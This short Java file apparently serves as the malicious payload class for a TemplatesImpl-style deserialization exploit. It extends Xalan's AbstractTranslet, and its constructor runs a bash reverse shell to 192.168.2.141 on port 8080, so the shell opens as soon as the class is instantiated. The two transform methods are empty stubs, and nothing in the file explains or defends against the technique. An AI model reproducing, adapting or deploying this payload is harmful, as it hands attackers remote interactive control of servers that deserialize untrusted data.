import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class Test extends AbstractTranslet {
	public Test() throws IOException {
		Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/192.168.2.141/8080 0>&1"});
	}

	@Override
	public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
	}

	public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

	}

	public static void main(String[] args) throws Exception {
		Test t = new Test();
	}
}
